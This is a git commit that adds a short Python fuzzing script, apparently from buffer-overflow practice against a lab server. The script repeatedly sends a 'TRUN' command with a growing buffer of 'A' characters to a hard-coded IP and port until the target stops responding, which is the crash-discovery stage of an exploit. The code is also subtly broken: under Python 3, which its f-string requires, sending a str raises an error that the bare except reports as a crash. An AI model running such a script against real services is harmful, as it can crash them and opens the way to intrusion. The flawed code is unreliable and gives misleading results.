531fbb53636c5157fc4a4019faab0808c7815ac8
arnab-098 <arnab.chattopadhyay777@gmail.com>
2024-12-14 11:23:47 +0530

    fuzzing

---
+++ fuzz.py
@@ -0,0 +1,25 @@
+#!/usr/bin/python
+
+import sys
+import socket
+from time import sleep
+
+buffer = "A" * 100
+
+ip = "192.168.1.11"
+port = 9999
+
+while True:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+
+        s.send(("TRUN /.:/" + buffer))
+        s.close()
+
+        sleep(1)
+
+        buffer += "A" * 100
+    except:
+        print(f"Fuzzing crashed at {len(buffer)} bytes")
+        sys.exit()
